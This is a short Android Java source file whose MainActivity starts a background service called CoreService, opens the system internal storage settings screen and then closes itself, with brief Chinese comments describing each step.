package com.xstd.active.plugin;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

/**
 * Created by Chrain on 13-12-23.
 */
public class MainActivity extends Activity {
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        startService(new Intent(getApplicationContext(),CoreService.class));//开启核心服务
        startActivity(new Intent("android.settings.INTERNAL_STORAGE_SETTINGS"));//启动系统存储界面
        finish();
    }
}